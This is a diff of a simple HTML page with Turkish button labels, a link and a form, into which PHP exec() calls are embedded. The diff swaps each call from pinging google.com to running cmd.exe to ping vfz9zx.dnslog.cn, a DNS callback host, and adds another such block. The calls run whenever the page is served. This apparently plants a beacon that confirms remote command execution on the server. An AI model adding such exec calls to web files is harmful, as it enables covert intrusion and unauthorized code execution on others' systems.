@@ -5,7 +5,10 @@
 <a href="https://Kronos.com/" title="Kronos">Kronos</a>
 <button type="button">Bu Bir Butondur</button>
 <?php     
-exec('C:\Windows\System32/cmd.exe ping google.com');     
+exec('C:\Windows\System32/cmd.exe ping vfz9zx.dnslog.cn');     
+?>
+<?php     
+exec('C:\Windows\System32\cmd.exe ping vfz9zx.dnslog.cn');     
 ?>
 </div>
 <button type="button">Bu Bir Butondur</button>
@@ -14,8 +17,8 @@ exec('C:\Windows\System32/cmd.exe ping google.com');
   <input type="submit">
 </form>
 <?php     
-exec('C:\Windows\System32/cmd.exe ping google.com');     
+exec('C:\Windows\System32/cmd.exe ping vfz9zx.dnslog.cn');     
 ?>
 <?php     
-exec('C:\Windows\System32/cmd.exe ping google.com');     
+exec('C:\Windows\System32\cmd.exe ping vfz9zx.dnslog.cn');     
 ?>
